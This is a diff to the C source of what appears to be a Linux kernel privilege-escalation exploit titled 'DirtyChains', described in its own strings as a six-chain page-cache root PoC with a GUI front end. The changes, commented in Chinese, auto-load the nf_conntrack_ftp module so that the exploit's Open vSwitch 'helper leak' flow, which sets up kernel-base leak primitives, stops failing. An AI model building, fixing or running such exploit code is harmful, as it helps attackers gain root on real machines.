@@ -2810,6 +2810,49 @@ struct prim {
     uint64_t kernel_base;
 };
 
+/*
+ * OVS 的 ct(helper=ftp) 在内核里会走 nf_conntrack_helper_try_module_get()，
+ * 拿不到 helper 就返回 -EINVAL，用户态看到的就是
+ *     建 helper 泄漏 flow 失败: Invalid argument
+ * 所以建 flow 之前先确保 nf_conntrack_ftp 已经加载。这个模块在 Ubuntu
+ * 上常常不在默认安装集里（linux-modules-extra），缺失时内核也未必能自动
+ * request_module（容器 / 精简 initramfs 里经常禁掉）。
+ */
+static int module_present(const char *name)
+{
+    char path[256];
+    struct stat st;
+
+    snprintf(path, sizeof(path), "/sys/module/%s", name);
+    return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
+}
+
+static void ensure_ct_helper(int verbose)
+{
+    static const char *mods[] = { "nf_conntrack", "nf_conntrack_ftp" };
+    size_t i;
+
+    for (i = 0; i < sizeof(mods) / sizeof(mods[0]); i++) {
+        char cmd[256], out[1024];
+        int n;
+
+        if (module_present(mods[i]))
+            continue;
+
+        if (verbose)
+            pr_dim("  %s 未加载，尝试 modprobe…\n", mods[i]);
+
+        snprintf(cmd, sizeof(cmd), "modprobe %s 2>&1", mods[i]);
+        out[0] = '\0';
+        n = run_cmd(cmd, out, sizeof(out));
+        if (verbose && n > 0) {
+            pr_err("  modprobe %s 失败: %s", mods[i], out);
+            if (out[n - 1] != '\n')
+                pr_err("\n");
+        }
+    }
+}
+
 static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
 {
     struct buf key, actions, leaked;
@@ -2872,11 +2915,23 @@ static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
     fake_output[0] = 0x00;
     fake_output[1] = 0x02;
 
+    /* ct(helper=ftp) 要求 nf_conntrack_ftp 已注册, 否则内核直接 EINVAL */
+    ensure_ct_helper(verbose);
+
     flow_key(&key, 1);
     clone_with_helper_leak(&actions, fake_output, sizeof(fake_output));
     ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex, &key, &actions);
     if (ret < 0) {
         pr_err("建 helper 泄漏 flow 失败: %s\n", strerror(-ret));
+        if (ret == -EINVAL) {
+            pr_dim("    内核拒绝 ct(helper=ftp)，多半是 nf_conntrack_ftp 没加载。\n"
+                   "    手工补上再重跑：\n"
+                   "      sudo modprobe nf_conntrack_ftp\n"
+                   "      ls /sys/module/nf_conntrack_ftp   # 出现的目录即已加载\n");
+        } else if (ret == -EOPNOTSUPP || ret == -ENOTSUP) {
+            pr_dim("    当前内核的 openvswitch 没编 conntrack 支持，"
+                   "ct action 不可用。\n");
+        }
         buf_free(&key); buf_free(&actions); buf_free(&leaked);
         return -1;
     }
@@ -3693,7 +3748,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r27"
+#define DF_BUILD        "2026-10-31-r28"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
